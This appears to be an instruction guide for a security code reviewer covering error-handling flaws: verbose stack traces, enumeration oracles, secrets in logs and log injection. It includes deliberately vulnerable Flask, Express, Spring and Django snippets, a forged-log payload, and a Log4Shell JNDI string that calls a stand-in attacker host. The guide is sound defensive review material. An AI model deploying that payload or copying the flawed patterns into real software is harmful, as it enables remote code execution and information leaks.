# error-handling-reviewer

Read this when reviewing error handling, exception management, and logging behavior.

## Goal

Find information disclosure through error messages, stack traces, verbose exceptions, enumeration oracles, and sensitive data written to logs.

## Part 1: Stack traces and detailed errors to clients

**Critical: framework debug stack traces exposed to clients**

Check for framework-level error handling that returns verbose errors:

```python
# Flask — missing error handlers, debug mode
# In debug mode, Werkzeug debugger exposes full stack trace + interactive console (RCE)
@app.route('/items/<id>')
def get_item(id):
    item = Item.query.get(id)   # raises exception if id is not int
    # No try/except — exception propagates to Werkzeug's debug page
```

```javascript
// Express — stack traces in production
app.use((err, req, res, next) => {
    res.status(500).json({ error: err.stack });   // stack trace to client
    // or
    res.status(500).send(err.message);            // raw exception message
});
```

```java
// Spring — exception details in response
@ExceptionHandler(Exception.class)
public ResponseEntity<String> handleError(Exception ex) {
    return ResponseEntity.status(500).body(ex.getMessage());  // internal details
    // Or: no exception handler → Spring default includes exception class and message
}
```

**What stack traces expose:**
- Full file system paths (OS, deployment structure)
- Library versions and dependency tree
- Database schema details in SQL exceptions
- Internal IP addresses and hostnames
- Business logic details from variable names and function names
- Sometimes: environment variables, configuration values

### Django-specific

```python
# settings.py — flag in production context
DEBUG = True       # see config-security-reviewer.md

# Even with DEBUG=False, check for custom error views that leak info
handler500 = 'myapp.views.server_error'   # read this view

# Check: custom exception middleware
class ExceptionMiddleware:
    def process_exception(self, request, exception):
        return HttpResponse(str(exception))   # leaks exception message
```

## Part 2: Differential error messages (enumeration oracles)

Error messages that differ based on whether data exists allow enumeration of valid data.

### Username enumeration

```python
# Flag: different messages for invalid user vs invalid password
@app.route('/login', methods=['POST'])
def login():
    user = User.query.filter_by(email=email).first()
    if not user:
        return jsonify({'error': 'User not found'}), 401    # leaks: user doesn't exist
    if not check_password_hash(user.password, password):
        return jsonify({'error': 'Invalid password'}), 401  # leaks: user exists, wrong password
```

Safe: use the same error message for both cases:
```python
return jsonify({'error': 'Invalid credentials'}), 401
```

Also check: response timing differences — failed user lookup should take the same time as failed password check (constant-time behavior).

### Account/email enumeration in registration

```python
# Flag: tells attacker which emails are registered
@app.route('/register', methods=['POST'])
def register():
    if User.query.filter_by(email=email).first():
        return jsonify({'error': 'Email already registered'})  # enumeration
```

### Password reset enumeration

```python
# Flag: reveals whether email is registered
@app.route('/password-reset', methods=['POST'])
def reset_password():
    user = User.query.filter_by(email=email).first()
    if not user:
        return jsonify({'error': 'No account found for this email'})   # enumeration
    # Safe: always return "If your email is registered, you'll receive a reset link"
```

## Part 3: Sensitive data in logs

### Passwords and secrets in logs

```python
# Flag: logging authentication data
logger.info(f"Login attempt: user={username}, password={password}")
logger.debug(f"API call with key={api_key}")
app.logger.info(f"Request body: {request.get_json()}")  # body may contain password
```

```java
// Flag
log.info("User {} authenticated with password {}", username, password);
log.debug("Received request: {}", request.toString());  // may include sensitive headers
```

### PII in logs

Flag logging of:
- Full credit card numbers (even partial masking issues: first 6 + last 4 != "masked")
- SSNs, national ID numbers
- Passwords and password hashes
- Authentication tokens, API keys, session IDs
- Full HTTP request bodies without sanitization (form data may contain passwords)
- Health information, financial data, private messages

### Log injection

If user-controlled data is logged without sanitization, an attacker can inject fake log entries:

```python
# Flag: user input in log
username = request.form['username']
logger.info(f"Login attempt from user: {username}")
# Payload: "admin\n2024-01-01 INFO Login successful for admin" → fake success log
```

Also flag:
- ANSI escape codes in logs (terminal escape injection for log viewers)
- Log4Shell pattern: `${jndi:ldap://attacker.com/x}` in logged user-controlled fields (Java/Log4j)

## Part 4: Error handling anti-patterns

### Swallowed exceptions hiding security errors

```python
# Flag: broad except that hides auth failures
try:
    result = check_authorization(user_id, resource_id)
except Exception:
    pass    # if check throws, authorization is silently bypassed
    result = True  # or falls through to authorized path
```

### Exception message forwarded from database

```python
# Flag: raw database exception returned to client
try:
    cursor.execute(query)
except Exception as e:
    return jsonify({'error': str(e)}), 500   # exposes table names, column names, query structure
```

Database exceptions often contain:
- `psycopg2.errors.UndefinedColumn: column "admin_secret" does not exist` → confirms column exists or doesn't
- `sqlalchemy.exc.IntegrityError: UNIQUE constraint failed: users.email` → confirms email exists

### Status code information leakage

```python
# Medium: 404 vs 403 reveals resource existence
@app.route('/api/documents/<id>')
@login_required
def get_document(id):
    doc = Document.query.get_or_404(id)   # returns 404 if doc doesn't exist
    if doc.owner_id != current_user.id:
        abort(403)                         # returns 403 if doc exists but unauthorized
# 404 → doc doesn't exist; 403 → doc exists, you don't have access
# Fix: return 404 in both cases if resource existence is sensitive
```

## Part 5: Security event logging gaps

Note missing logging for security-sensitive events (not vulnerabilities, but risk indicators):

- Failed authentication attempts not logged
- Successful authentications not logged (no audit trail)
- Authorization failures not logged
- Admin actions not logged
- File access not logged
- Sensitive data access (PII, financial) not logged with user context

These are informational/low findings but important for incident response capability.

## Output format

```json
{
  "file": "app/views/auth.py",
  "line": 28,
  "category": "username_enumeration",
  "title": "Username enumeration via differential login error messages",
  "description": "Login endpoint returns 'User not found' for invalid usernames and 'Invalid password' for valid usernames with wrong passwords. Allows enumeration of registered usernames.",
  "evidence": "Line 28: return error('User not found') vs line 33: return error('Invalid password')",
  "impact": "Attacker can enumerate valid email addresses for targeted phishing or credential stuffing.",
  "remediation": "Return a uniform error message for both cases: 'Invalid credentials'. Ensure response timing is constant.",
  "cwe": "CWE-203",
  "severity": "medium"
}
```
